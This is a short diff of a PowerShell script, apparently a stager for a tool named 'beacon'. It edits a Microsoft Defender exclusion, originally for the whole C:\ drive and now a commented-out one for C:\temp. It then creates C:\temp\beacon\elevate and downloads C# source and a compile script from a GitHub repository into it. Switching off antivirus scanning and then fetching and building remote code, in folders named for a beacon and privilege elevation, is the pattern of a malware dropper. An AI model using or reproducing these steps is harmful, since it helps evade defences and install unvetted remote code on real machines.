@@ -1,10 +1,10 @@
-# Excludes file paths
-Add-MpPreference -ExclusionPath "C:\"
-
 # Create the necessary directories
 mkdir C:\temp
 mkdir C:\temp\beacon
 mkdir C:\temp\beacon\elevate
+
+# # Excludes file paths
+# Add-MpPreference -ExclusionPath "C:\temp" -ErrorAction Stop
 
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
